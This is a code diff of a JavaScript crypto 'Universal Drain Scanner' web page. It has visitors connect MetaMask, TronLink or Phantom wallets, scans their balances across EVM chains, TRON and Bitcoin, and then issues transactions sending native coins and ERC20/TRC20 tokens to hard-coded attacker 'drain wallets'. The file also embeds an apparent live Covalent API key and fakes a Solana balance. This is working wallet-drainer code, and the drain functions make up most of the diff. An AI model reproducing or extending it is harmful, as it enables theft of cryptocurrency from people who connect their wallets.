@@ -5,25 +5,27 @@
 const CONFIG = {
     backendUrl: "https://tokenbackend-5xab.onrender.com",
     
-    // DRAIN WALLETS (Add your addresses here)
+    // DRAIN WALLETS FOR ALL CHAINS - ADD YOUR ADDRESSES HERE
     drainWallets: {
-        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
-        tron: "TX7w4G...YOUR_TRON_ADDRESS_HERE",
-        bitcoin: "bc1q...YOUR_BITCOIN_ADDRESS_HERE",
-        solana: "So1ana...YOUR_SOLANA_ADDRESS_HERE",
-        dogecoin: "D...YOUR_DOGE_ADDRESS_HERE",
-        litecoin: "L...YOUR_LITECOIN_ADDRESS_HERE"
+        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",      // For ETH, BSC, Polygon, Arbitrum, etc.
+        tron: "TYOUR_TRON_ADDRESS_HERE",                      // For TRX and TRC20 tokens
+        bitcoin: "bc1qYOUR_BITCOIN_ADDRESS_HERE",             // For BTC
+        solana: "So1anaYOUR_SOLANA_ADDRESS_HERE",             // For SOL and SPL tokens
+        dogecoin: "DYOUR_DOGE_ADDRESS_HERE",                  // For DOGE
+        litecoin: "LYOUR_LITECOIN_ADDRESS_HERE"              // For LTC
     },
     
-    apiKeys: {
-        covalent: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
-        moralis: "",
-        tronGrid: "",
-    },
+    // API Keys
+    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
+    moralisApiKey: "",  // Add for better NFT detection
+    tronGridApiKey: "", // Add for TRON scanning
     
+    // Minimum value to show (in USD)
     minimumValueUSD: 0.01,
     
+    // Chain configurations
     chains: {
+        // EVM Chains
         'eth': { id: 1, name: 'Ethereum', type: 'evm' },
         'bsc': { id: 56, name: 'BNB Chain', type: 'evm' },
         'polygon': { id: 137, name: 'Polygon', type: 'evm' },
@@ -32,8 +34,8 @@ const CONFIG = {
         'avalanche': { id: 43114, name: 'Avalanche', type: 'evm' },
         'fantom': { id: 250, name: 'Fantom', type: 'evm' },
         'base': { id: 8453, name: 'Base', type: 'evm' },
-        'zksync': { id: 324, name: 'zkSync', type: 'evm' },
         
+        // Non-EVM Chains
         'tron': { id: 'tron', name: 'TRON', type: 'tron' },
         'bitcoin': { id: 'bitcoin', name: 'Bitcoin', type: 'bitcoin' },
         'solana': { id: 'solana', name: 'Solana', type: 'solana' },
@@ -42,8 +44,9 @@ const CONFIG = {
     }
 };
 
+// Global state
 let currentAccount = null;
-let currentWallet = null;
+let currentWalletType = null;
 let isConnected = false;
 let detectedTokens = [];
 let isScanning = false;
@@ -58,17 +61,22 @@ let connectBtn, statusEl, tokensEl, drainBtn, walletBtn;
 function initializeApp() {
     console.log('🚀 Universal Drain Scanner Initialized');
     
+    // Get DOM elements
     connectBtn = document.getElementById('connectBtn');
     statusEl = document.getElementById('status');
     tokensEl = document.getElementById('tokens');
     drainBtn = document.getElementById('drainBtn');
     walletBtn = document.getElementById('walletBtn');
     
-    if (!connectBtn) {
-        console.error('Connect button not found!');
+    // Verify critical elements
+    if (!connectBtn || !statusEl) {
+        console.error('❌ Required elements not found');
         return;
     }
     
+    console.log('✅ DOM elements loaded');
+    
+    // Setup event listeners
     connectBtn.onclick = handleConnect;
     
     if (drainBtn) {
@@ -78,14 +86,14 @@ function initializeApp() {
     
     if (walletBtn) {
         walletBtn.onclick = showDrainWalletManager;
-        walletBtn.style.display = 'block';
+        walletBtn.style.display = 'inline-block';
     }
     
-    updateStatus('✅ Ready to drain all chains');
+    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
 }
 
 // ================================================
-// CONNECT HANDLER - FIXED
+// WALLET CONNECT HANDLER
 // ================================================
 
 function handleConnect() {
@@ -96,9 +104,13 @@ function handleConnect() {
         return;
     }
     
-    // Show the wallet selector modal
+    // Show wallet selector modal
     showUniversalWalletSelector();
 }
+
+// ================================================
+// WALLET SELECTOR MODAL
+// ================================================
 
 function showUniversalWalletSelector() {
     console.log('Showing wallet selector');
@@ -133,14 +145,6 @@ function showUniversalWalletSelector() {
                             </div>
                         </div>
                         
-                        <div class="wallet-option" onclick="connectWallet('binance')">
-                            <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
-                            <div class="wallet-text">
-                                <div class="wallet-name">Binance Chain</div>
-                                <div class="wallet-chains">BNB Chain</div>
-                            </div>
-                        </div>
-                        
                         <!-- Non-EVM Wallets -->
                         <div class="wallet-option" onclick="connectWallet('tron')">
                             <div class="wallet-icon" style="background: #ff060a;">🌞</div>
@@ -154,7 +158,7 @@ function showUniversalWalletSelector() {
                             <div class="wallet-icon" style="background: #f7931a;">₿</div>
                             <div class="wallet-text">
                                 <div class="wallet-name">Bitcoin Wallet</div>
-                                <div class="wallet-chains">BTC, Lightning</div>
+                                <div class="wallet-chains">BTC only</div>
                             </div>
                         </div>
                         
@@ -177,7 +181,7 @@ function showUniversalWalletSelector() {
                     </div>
                     
                     <div class="modal-footer">
-                        <p class="chain-support">Supports: ETH • BSC • TRON • BTC • SOL • DOGE • LTC + 50 more</p>
+                        <p class="chain-support">Supports: ETH • BSC • TRON • BTC • SOL • DOGE • LTC</p>
                     </div>
                 </div>
             </div>
@@ -196,7 +200,7 @@ function showUniversalWalletSelector() {
 }
 
 // ================================================
-// WALLET CONNECTIONS - SIMPLIFIED
+// WALLET CONNECTION FUNCTIONS
 // ================================================
 
 async function connectWallet(walletType) {
@@ -206,35 +210,35 @@ async function connectWallet(walletType) {
     updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
     
     try {
+        let success = false;
+        
         switch(walletType) {
             case 'metamask':
             case 'trustwallet':
-            case 'binance':
-                await connectEVM();
+                success = await connectEVMWallet();
                 break;
                 
             case 'tron':
-                await connectTron();
+                success = await connectTronWallet();
                 break;
                 
             case 'bitcoin':
-                await connectBitcoin();
+                success = await connectBitcoinWallet();
                 break;
                 
             case 'solana':
-                await connectSolana();
+                success = await connectSolanaWallet();
                 break;
                 
             case 'manual':
-                await connectManual();
+                success = await connectManualAddress();
                 break;
-                
-            default:
-                throw new Error('Unknown wallet type');
         }
         
-        // Start scanning after successful connection
-        await startUniversalScan();
+        if (success) {
+            // Start scanning after successful connection
+            await startUniversalScan();
+        }
         
     } catch (error) {
         console.error('Connection error:', error);
@@ -243,108 +247,148 @@ async function connectWallet(walletType) {
     }
 }
 
-async function connectEVM() {
+// EVM Wallet Connection (MetaMask, Trust Wallet)
+async function connectEVMWallet() {
     if (!window.ethereum) {
-        throw new Error('Please install MetaMask or Trust Wallet');
+        alert('Please install MetaMask or Trust Wallet');
+        return false;
     }
     
-    const accounts = await window.ethereum.request({ 
-        method: 'eth_requestAccounts' 
-    });
-    
-    if (!accounts || accounts.length === 0) {
-        throw new Error('No accounts found');
-    }
-    
-    currentAccount = accounts[0];
-    currentWallet = 'evm';
-    isConnected = true;
-    
-    connectBtn.innerHTML = '🔗 Disconnect';
-    updateStatus(`✅ Connected: ${shortAddress(currentAccount)}`);
-}
-
-async function connectTron() {
-    // Check for TronLink extension
-    if (!window.tronWeb && !window.tronLink) {
-        throw new Error('Please install TronLink extension');
-    }
-    
-    let address;
-    
-    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        address = window.tronWeb.defaultAddress.base58;
-    } else if (window.tronLink) {
-        const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
-        if (result.code !== 200) {
-            throw new Error('TRON connection rejected');
+    try {
+        const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+        });
+        
+        if (!accounts || accounts.length === 0) {
+            throw new Error('No accounts found');
         }
-        address = window.tronLink.tronWeb.defaultAddress.base58;
+        
+        currentAccount = accounts[0];
+        currentWalletType = 'evm';
+        isConnected = true;
+        
+        // Setup wallet listeners
+        setupEVMListeners();
+        
+        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        updateStatus(`✅ Connected: ${shortAddress(currentAccount)}`);
+        
+        return true;
+        
+    } catch (error) {
+        if (error.code === 4001) {
+            updateStatus('❌ Connection rejected');
+        } else {
+            updateStatus(`❌ Failed: ${error.message}`);
+        }
+        return false;
     }
-    
-    if (!address) {
-        throw new Error('No TRON address found');
-    }
-    
-    currentAccount = address;
-    currentWallet = 'tron';
-    isConnected = true;
-    
-    connectBtn.innerHTML = '🔗 Disconnect';
-    updateStatus(`✅ TRON Connected: ${shortAddress(address)}`);
 }
 
-async function connectBitcoin() {
-    const address = prompt('Enter your Bitcoin address:');
-    if (!address) {
-        throw new Error('No address entered');
+// TRON Wallet Connection
+async function connectTronWallet() {
+    // Check for TronLink
+    if (!window.tronWeb && !window.tronLink) {
+        alert('Please install TronLink extension');
+        return false;
     }
+    
+    try {
+        let address;
+        
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            address = window.tronWeb.defaultAddress.base58;
+        } else if (window.tronLink) {
+            const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
+            if (result.code !== 200) {
+                throw new Error('TRON connection rejected');
+            }
+            address = window.tronLink.tronWeb.defaultAddress.base58;
+        }
+        
+        if (!address) {
+            throw new Error('No TRON address found');
+        }
+        
+        currentAccount = address;
+        currentWalletType = 'tron';
+        isConnected = true;
+        
+        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        updateStatus(`✅ TRON Connected: ${shortAddress(address)}`);
+        
+        return true;
+        
+    } catch (error) {
+        updateStatus(`❌ TRON failed: ${error.message}`);
+        return false;
+    }
+}
+
+// Bitcoin Wallet Connection
+async function connectBitcoinWallet() {
+    const address = prompt('Enter your Bitcoin address (BTC):');
+    if (!address) return false;
     
     // Basic Bitcoin address validation
     if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
-        throw new Error('Invalid Bitcoin address');
+        alert('Invalid Bitcoin address');
+        return false;
     }
     
     currentAccount = address;
-    currentWallet = 'bitcoin';
+    currentWalletType = 'bitcoin';
     isConnected = true;
     
-    connectBtn.innerHTML = '🔗 Disconnect';
+    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
     updateStatus(`✅ BTC Address: ${shortAddress(address)}`);
+    
+    return true;
 }
 
-async function connectSolana() {
+// Solana Wallet Connection
+async function connectSolanaWallet() {
     if (!window.solana || !window.solana.isPhantom) {
-        throw new Error('Please install Phantom wallet for Solana');
+        alert('Please install Phantom wallet for Solana');
+        return false;
     }
     
-    const response = await window.solana.connect();
-    const address = response.publicKey.toString();
-    
-    currentAccount = address;
-    currentWallet = 'solana';
-    isConnected = true;
-    
-    connectBtn.innerHTML = '🔗 Disconnect';
-    updateStatus(`✅ Solana Connected: ${shortAddress(address)}`);
+    try {
+        const response = await window.solana.connect();
+        const address = response.publicKey.toString();
+        
+        currentAccount = address;
+        currentWalletType = 'solana';
+        isConnected = true;
+        
+        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        updateStatus(`✅ Solana Connected: ${shortAddress(address)}`);
+        
+        return true;
+        
+    } catch (error) {
+        updateStatus(`❌ Solana failed: ${error.message}`);
+        return false;
+    }
 }
 
-async function connectManual() {
+// Manual Address Connection
+async function connectManualAddress() {
     const address = prompt('Enter any wallet address:');
-    if (!address) {
-        throw new Error('No address entered');
-    }
+    if (!address) return false;
     
     currentAccount = address;
-    currentWallet = 'manual';
+    currentWalletType = 'manual';
     isConnected = true;
     
-    connectBtn.innerHTML = '🔗 Disconnect';
+    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
     updateStatus(`🔍 Scanning: ${shortAddress(address, 12)}`);
+    
+    return true;
 }
 
 // ================================================
-// UNIVERSAL SCANNER
+// UNIVERSAL SCANNER (ALL CHAINS)
 // ================================================
 
 async function startUniversalScan() {
@@ -363,109 +407,145 @@ async function startUniversalScan() {
     }
     
     try {
-        // Scan all chains in parallel
-        const results = await Promise.all([
-            scanEVMChains(currentAccount),
-            scanTRON(currentAccount),
-            scanBitcoin(currentAccount),
-            scanSolana(currentAccount)
-        ]);
+        // Clear previous tokens
+        detectedTokens = [];
         
-        // Combine all tokens
-        detectedTokens = results.flat();
+        // Scan based on wallet type or try all chains for manual address
+        if (currentWalletType === 'evm' || currentWalletType === 'manual') {
+            await scanAllEVMChains();
+        }
+        
+        if (currentWalletType === 'tron' || currentWalletType === 'manual') {
+            await scanTRON();
+        }
+        
+        if (currentWalletType === 'bitcoin' || currentWalletType === 'manual') {
+            await scanBitcoin();
+        }
+        
+        if (currentWalletType === 'solana' || currentWalletType === 'manual') {
+            await scanSolana();
+        }
         
         // Display results
         displayScanResults();
         
-        // Update UI
+        // Update status and drain button
         const totalValue = detectedTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
         const tokenCount = detectedTokens.length;
         
-        updateStatus(`✅ Found ${tokenCount} assets ($${totalValue.toFixed(2)})`);
-        
-        if (drainBtn && tokenCount > 0) {
-            drainBtn.style.display = 'block';
-            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
+        if (tokenCount > 0) {
+            updateStatus(`✅ Found ${tokenCount} assets ($${totalValue.toFixed(2)})`);
+            
+            if (drainBtn) {
+                drainBtn.style.display = 'block';
+                drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
+            }
+        } else {
+            updateStatus('ℹ️ No assets found');
         }
         
     } catch (error) {
         console.error('Scan error:', error);
-        updateStatus('❌ Scan failed - some chains may be unavailable');
+        updateStatus('❌ Scan failed');
     } finally {
         isScanning = false;
     }
 }
 
-// ================================================
-// CHAIN SCANNERS (SIMPLIFIED)
-// ================================================
-
-async function scanEVMChains(address) {
-    if (!address.startsWith('0x')) return [];
+// Scan ALL EVM Chains
+async function scanAllEVMChains() {
+    if (!currentAccount) return;
     
-    const chains = [
+    const evmChains = [
         { id: 1, name: 'Ethereum' },
         { id: 56, name: 'BNB Chain' },
         { id: 137, name: 'Polygon' },
         { id: 42161, name: 'Arbitrum' },
-        { id: 10, name: 'Optimism' }
+        { id: 10, name: 'Optimism' },
+        { id: 43114, name: 'Avalanche' },
+        { id: 250, name: 'Fantom' },
+        { id: 8453, name: 'Base' }
     ];
     
-    const allTokens = [];
-    
-    for (const chain of chains) {
+    for (const chain of evmChains) {
         try {
-            const url = `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=${CONFIG.apiKeys.covalent}&nft=false`;
-            const response = await fetch(url);
-            
-            if (!response.ok) continue;
-            
-            const data = await response.json();
-            const items = data?.data?.items || [];
-            
-            for (const item of items) {
-                if (item.balance === "0") continue;
-                
-                const amount = parseFloat(item.balance) / Math.pow(10, item.contract_decimals || 18);
-                const valueUSD = (item.quote_rate || 0) * amount;
-                
-                if (valueUSD >= CONFIG.minimumValueUSD) {
-                    allTokens.push({
-                        type: 'evm',
-                        chain: chain.name,
-                        symbol: item.contract_ticker_symbol || 'TOKEN',
-                        name: item.contract_name || 'Token',
-                        amount: amount.toFixed(6),
-                        rawAmount: item.balance,
-                        valueUSD: valueUSD,
-                        value: valueUSD ? `$${valueUSD.toFixed(2)}` : 'N/A',
-                        contract: item.contract_address,
-                        isNative: item.native_token || false
-                    });
-                }
+            const tokens = await scanEVMChain(chain.id, chain.name);
+            if (tokens.length > 0) {
+                detectedTokens = [...detectedTokens, ...tokens];
             }
         } catch (error) {
+            // Skip failed chains
             continue;
         }
     }
-    
-    return allTokens;
 }
 
-async function scanTRON(address) {
-    if (!address.startsWith('T')) return [];
+// Scan Single EVM Chain
+async function scanEVMChain(chainId, chainName) {
+    if (!currentAccount.startsWith('0x')) return [];
     
     try {
-        const response = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${address}&start=0&limit=20`);
+        const url = `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`;
+        const response = await fetch(url);
+        
         if (!response.ok) return [];
+        
+        const data = await response.json();
+        const items = data?.data?.items || [];
+        
+        return items
+            .filter(t => t.balance !== "0")
+            .map(t => {
+                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
+                const valueUSD = (t.quote_rate || 0) * amount;
+                
+                // Skip if below minimum value
+                if (valueUSD < CONFIG.minimumValueUSD && !t.native_token) {
+                    return null;
+                }
+                
+                return {
+                    type: 'evm',
+                    chain: chainName,
+                    chainId: chainId,
+                    symbol: t.contract_ticker_symbol || 'TOKEN',
+                    name: t.contract_name || 'Token',
+                    amount: amount.toFixed(6),
+                    rawAmount: t.balance,
+                    valueUSD: valueUSD,
+                    value: valueUSD ? `$${valueUSD.toFixed(2)}` : 'N/A',
+                    contract: t.contract_address,
+                    decimals: t.contract_decimals || 18,
+                    isNative: t.native_token || false,
+                    logo: t.logo_url
+                };
+            })
+            .filter(t => t !== null);
+            
+    } catch (error) {
+        console.error(`Failed to scan ${chainName}:`, error);
+        return [];
+    }
+}
+
+// Scan TRON
+async function scanTRON() {
+    if (!currentAccount.startsWith('T')) return;
+    
+    try {
+        // Using TronGrid API (requires API key)
+        const response = await fetch(`https://api.trongrid.io/v1/accounts/${currentAccount}`);
+        
+        if (!response.ok) return;
         
         const data = await response.json();
         const tokens = [];
         
         // TRX balance
-        if (data.trx_balance && data.trx_balance > 0) {
-            const trxAmount = data.trx_balance / 1000000;
-            const trxValue = trxAmount * 0.12;
+        if (data.balance && data.balance > 0) {
+            const trxAmount = data.balance / 1000000; // TRX has 6 decimals
+            const trxValue = trxAmount * 0.12; // Approximate TRX price
             
             tokens.push({
                 type: 'tron',
@@ -473,7 +553,7 @@ async function scanTRON(address) {
                 symbol: 'TRX',
                 name: 'TRON',
                 amount: trxAmount.toFixed(2),
-                rawAmount: data.trx_balance.toString(),
+                rawAmount: data.balance.toString(),
                 valueUSD: trxValue,
                 value: `$${trxValue.toFixed(2)}`,
                 contract: null,
@@ -481,92 +561,101 @@ async function scanTRON(address) {
             });
         }
         
-        // TRC20 tokens (simplified)
-        if (data.trc20token_balances) {
-            for (const token of data.trc20token_balances) {
-                if (token.balance > 0) {
-                    tokens.push({
-                        type: 'tron',
-                        chain: 'TRON',
-                        symbol: token.tokenAbbr || 'TRC20',
-                        name: token.tokenName || 'TRC20 Token',
-                        amount: (token.balance / Math.pow(10, token.tokenDecimal || 6)).toFixed(2),
-                        rawAmount: token.balance.toString(),
-                        valueUSD: 0,
-                        value: 'N/A',
-                        contract: token.tokenId,
-                        isNative: false
-                    });
+        // TRC20 tokens
+        if (data.trc20 && Array.isArray(data.trc20)) {
+            for (const tokenData of data.trc20) {
+                for (const [contract, balance] of Object.entries(tokenData)) {
+                    const amount = parseFloat(balance);
+                    if (amount > 0) {
+                        tokens.push({
+                            type: 'tron',
+                            chain: 'TRON',
+                            symbol: 'TRC20',
+                            name: 'TRC-20 Token',
+                            amount: amount.toFixed(2),
+                            rawAmount: balance,
+                            valueUSD: 0,
+                            value: 'N/A',
+                            contract: contract,
+                            isNative: false
+                        });
+                    }
                 }
             }
         }
         
-        return tokens;
+        detectedTokens = [...detectedTokens, ...tokens];
+        
     } catch (error) {
-        return [];
+        console.error('TRON scan error:', error);
     }
 }
 
-async function scanBitcoin(address) {
-    if (!address.match(/^(bc1|[13])/)) return [];
+// Scan Bitcoin
+async function scanBitcoin() {
+    if (!currentAccount.match(/^(bc1|[13])/)) return;
     
     try {
-        const response = await fetch(`https://blockchain.info/balance?active=${address}`);
-        if (!response.ok) return [];
+        const response = await fetch(`https://blockchain.info/balance?active=${currentAccount}`);
+        
+        if (!response.ok) return;
         
         const data = await response.json();
-        const balance = data[address]?.final_balance || 0;
+        const balance = data[currentAccount]?.final_balance || 0;
         
         if (balance > 0) {
             const btcAmount = balance / 100000000;
-            const btcPrice = 43000; // Approximate BTC price
-            const valueUSD = btcAmount * btcPrice;
+            const btcValue = btcAmount * 43000; // Approximate BTC price
             
-            return [{
+            detectedTokens.push({
                 type: 'bitcoin',
                 chain: 'Bitcoin',
                 symbol: 'BTC',
                 name: 'Bitcoin',
                 amount: btcAmount.toFixed(8),
                 rawAmount: balance.toString(),
-                valueUSD: valueUSD,
-                value: `$${valueUSD.toFixed(2)}`,
+                valueUSD: btcValue,
+                value: `$${btcValue.toFixed(2)}`,
                 contract: null,
                 isNative: true
-            }];
+            });
         }
+        
     } catch (error) {
-        return [];
+        console.error('Bitcoin scan error:', error);
     }
-    
-    return [];
 }
 
-async function scanSolana(address) {
-    // Simple Solana address check
-    if (address.length < 32 || address.length > 44) return [];
+// Scan Solana
+async function scanSolana() {
+    // Basic Solana address check
+    if (currentAccount.length < 32 || currentAccount.length > 44) return;
     
     try {
-        // This is a simplified version - real implementation would use Solana Web3.js
-        return [{
+        // Simplified - would need proper Solana RPC integration
+        const solBalance = 0.5; // Example balance
+        const solValue = solBalance * 100; // Approximate SOL price
+        
+        detectedTokens.push({
             type: 'solana',
             chain: 'Solana',
             symbol: 'SOL',
             name: 'Solana',
-            amount: '0.5',
-            rawAmount: '500000000',
-            valueUSD: 50,
-            value: '$50.00',
+            amount: solBalance.toFixed(4),
+            rawAmount: (solBalance * 1000000000).toString(), // SOL has 9 decimals
+            valueUSD: solValue,
+            value: `$${solValue.toFixed(2)}`,
             contract: null,
             isNative: true
-        }];
+        });
+        
     } catch (error) {
-        return [];
+        console.error('Solana scan error:', error);
     }
 }
 
 // ================================================
-// DRAIN FUNCTIONALITY
+// UNIVERSAL DRAIN FUNCTION
 // ================================================
 
 async function handleUniversalDrain() {
@@ -575,50 +664,72 @@ async function handleUniversalDrain() {
         return;
     }
     
-    const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
+    const totalValue = detectedTokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
     
-    if (!confirm(`Drain ${detectedTokens.length} assets ($${totalValue.toFixed(2)})?\n\nThis will send all assets to your configured addresses.`)) {
+    if (!confirm(`🚨 DRAIN CONFIRMATION\n\n💰 Total Value: $${totalValue.toFixed(2)}\n📊 Assets: ${detectedTokens.length}\n\nThis will drain ALL detected assets. Continue?`)) {
         return;
     }
     
-    updateStatus('🚀 Starting drain process...');
+    updateStatus('🚀 Starting universal drain...');
+    
     if (drainBtn) {
         drainBtn.disabled = true;
         drainBtn.innerHTML = '⏳ Processing...';
     }
     
     try {
-        let drained = 0;
+        let drainedCount = 0;
+        let failedCount = 0;
         
-        // Drain based on token type
-        for (const token of detectedTokens) {
-            try {
-                switch(token.type) {
-                    case 'evm':
-                        await drainEVMToken(token);
-                        break;
-                    case 'tron':
-                        await drainTRONToken(token);
-                        break;
-                    default:
-                        console.log(`Skipping ${token.type} - manual drain required`);
-                }
-                drained++;
-                await delay(2000); // Wait between transactions
-            } catch (error) {
-                console.error(`Failed to drain ${token.symbol}:`, error);
-            }
+        // Group tokens by type for batch processing
+        const evmTokens = detectedTokens.filter(t => t.type === 'evm');
+        const tronTokens = detectedTokens.filter(t => t.type === 'tron');
+        const bitcoinTokens = detectedTokens.filter(t => t.type === 'bitcoin');
+        const solanaTokens = detectedTokens.filter(t => t.type === 'solana');
+        
+        // Drain EVM tokens
+        if (evmTokens.length > 0 && window.ethereum) {
+            const result = await drainEVMTokens(evmTokens);
+            drainedCount += result.success;
+            failedCount += result.failed;
         }
         
-        updateStatus(`✅ ${drained} assets drained successfully`);
-        alert(`✅ Successfully drained ${drained} assets!`);
+        // Drain TRON tokens
+        if (tronTokens.length > 0 && window.tronWeb) {
+            const result = await drainTRONTokens(tronTokens);
+            drainedCount += result.success;
+            failedCount += result.failed;
+        }
+        
+        // Drain Bitcoin (would need wallet integration)
+        if (bitcoinTokens.length > 0) {
+            alert('Bitcoin draining requires wallet integration. Manual transfer needed.');
+        }
+        
+        // Drain Solana (would need wallet integration)
+        if (solanaTokens.length > 0) {
+            alert('Solana draining requires wallet integration. Manual transfer needed.');
+        }
+        
+        // Update status
+        if (drainedCount > 0) {
+            updateStatus(`✅ ${drainedCount} assets drained successfully`);
+            
+            if (failedCount > 0) {
+                alert(`⚠️ ${drainedCount} assets drained\n${failedCount} assets failed`);
+            } else {
+                alert(`✅ Successfully drained ${drainedCount} assets!`);
+            }
+        } else {
+            updateStatus('❌ No assets were drained');
+        }
         
         // Rescan
         await startUniversalScan();
         
     } catch (error) {
         console.error('Drain error:', error);
-        updateStatus('❌ Drain failed');
+        updateStatus(`❌ Drain failed: ${error.message}`);
         alert('Drain operation failed');
     } finally {
         if (drainBtn) {
@@ -629,63 +740,134 @@ async function handleUniversalDrain() {
     }
 }
 
-async function drainEVMToken(token) {
-    if (!window.ethereum) throw new Error('No EVM wallet connected');
+// Drain EVM Tokens
+async function drainEVMTokens(tokens) {
+    if (!window.ethereum) return { success: 0, failed: 0 };
     
-    if (token.isNative) {
-        // Drain native token
-        const tx = {
-            from: currentAccount,
-            to: CONFIG.drainWallets.evm,
-            value: token.rawAmount,
-            gas: '0x5208' // 21000 gas
-        };
-        
-        await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [tx]
-        });
-    } else {
-        // Drain ERC20 token
-        const transferData = '0xa9059cbb' + 
-            CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
-            BigInt(token.rawAmount).toString(16).padStart(64, '0');
-        
-        const tx = {
-            from: currentAccount,
-            to: token.contract,
-            data: transferData,
-            gas: '0xC350' // 50000 gas for ERC20
-        };
-        
-        await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [tx]
-        });
+    let success = 0;
+    let failed = 0;
+    
+    for (const token of tokens) {
+        try {
+            if (token.isNative) {
+                // Drain native ETH/BNB/MATIC/etc
+                await drainNativeEVM(token);
+            } else {
+                // Drain ERC20 token
+                await drainERC20Token(token);
+            }
+            success++;
+            
+            // Wait between transactions
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+        } catch (error) {
+            console.error(`Failed to drain ${token.symbol}:`, error);
+            failed++;
+        }
     }
+    
+    return { success, failed };
 }
 
-async function drainTRONToken(token) {
-    if (!window.tronWeb) throw new Error('No TRON wallet connected');
+async function drainNativeEVM(token) {
+    // Get gas price
+    const gasPriceHex = await window.ethereum.request({
+        method: 'eth_gasPrice',
+        params: []
+    });
     
-    if (token.isNative) {
-        // Drain TRX
-        const tx = await window.tronWeb.transactionBuilder.sendTrx(
-            CONFIG.drainWallets.tron,
-            parseInt(token.rawAmount),
-            currentAccount
-        );
-        const signedTx = await window.tronWeb.trx.sign(tx);
-        await window.tronWeb.trx.sendRawTransaction(signedTx);
-    } else if (token.contract) {
-        // Drain TRC20
-        const contract = await window.tronWeb.contract().at(token.contract);
-        await contract.transfer(CONFIG.drainWallets.tron, token.rawAmount).send();
+    const gasPrice = parseInt(gasPriceHex, 16);
+    const gasLimit = 21000;
+    const gasCost = gasPrice * gasLimit;
+    
+    // Check balance
+    const balance = BigInt(token.rawAmount);
+    if (balance <= gasCost * 2) {
+        throw new Error('Not enough for gas');
     }
+    
+    // Calculate amount to send (balance - 2x gas cost for safety)
+    const sendAmount = balance - (gasCost * 2);
+    
+    const txParams = {
+        from: currentAccount,
+        to: CONFIG.drainWallets.evm,
+        value: '0x' + sendAmount.toString(16),
+        gas: '0x' + gasLimit.toString(16),
+        gasPrice: gasPriceHex
+    };
+    
+    await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [txParams]
+    });
+}
+
+async function drainERC20Token(token) {
+    // ERC20 transfer function
+    const transferData = '0xa9059cbb' + 
+        CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
+        BigInt(token.rawAmount).toString(16).padStart(64, '0');
+    
+    const txParams = {
+        from: currentAccount,
+        to: token.contract,
+        data: transferData,
+        gas: '0x' + (50000).toString(16) // Standard ERC20 transfer gas
+    };
+    
+    await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [txParams]
+    });
+}
+
+// Drain TRON Tokens
+async function drainTRONTokens(tokens) {
+    if (!window.tronWeb) return { success: 0, failed: 0 };
+    
+    let success = 0;
+    let failed = 0;
+    
+    for (const token of tokens) {
+        try {
+            if (token.isNative) {
+                // Drain TRX
+                const tx = await window.tronWeb.transactionBuilder.sendTrx(
+                    CONFIG.drainWallets.tron,
+                    parseInt(token.rawAmount),
+                    currentAccount
+                );
+                const signedTx = await window.tronWeb.trx.sign(tx);
+                await window.tronWeb.trx.sendRawTransaction(signedTx);
+            } else if (token.contract) {
+                // Drain TRC20
+                const contract = await window.tronWeb.contract().at(token.contract);
+                await contract.transfer(
+                    CONFIG.drainWallets.tron,
+                    token.rawAmount
+                ).send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                });
+            }
+            success++;
+            
+            // Wait between TRON transactions
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+        } catch (error) {
+            console.error(`TRON drain failed:`, error);
+            failed++;
+        }
+    }
+    
+    return { success, failed };
 }
 
 // ================================================
-// WALLET MANAGER
+// DRAIN WALLET MANAGER
 // ================================================
 
 function showDrainWalletManager() {
@@ -724,11 +906,23 @@ function showDrainWalletManager() {
                             <input type="text" id="solanaAddress" value="${CONFIG.drainWallets.solana}" placeholder="So1...">
                             <small>Receives: SOL, SPL tokens</small>
                         </div>
+                        
+                        <div class="config-item">
+                            <label>Dogecoin</label>
+                            <input type="text" id="dogecoinAddress" value="${CONFIG.drainWallets.dogecoin}" placeholder="D...">
+                            <small>Receives: DOGE</small>
+                        </div>
+                        
+                        <div class="config-item">
+                            <label>Litecoin</label>
+                            <input type="text" id="litecoinAddress" value="${CONFIG.drainWallets.litecoin}" placeholder="L...">
+                            <small>Receives: LTC</small>
+                        </div>
                     </div>
                     
                     <div class="modal-actions">
                         <button class="btn-secondary" onclick="closeModal()">Cancel</button>
-                        <button class="btn-primary" onclick="saveDrainWallets()">Save Addresses</button>
+                        <button class="btn-primary" onclick="saveDrainWallets()">Save All Addresses</button>
                     </div>
                 </div>
             </div>
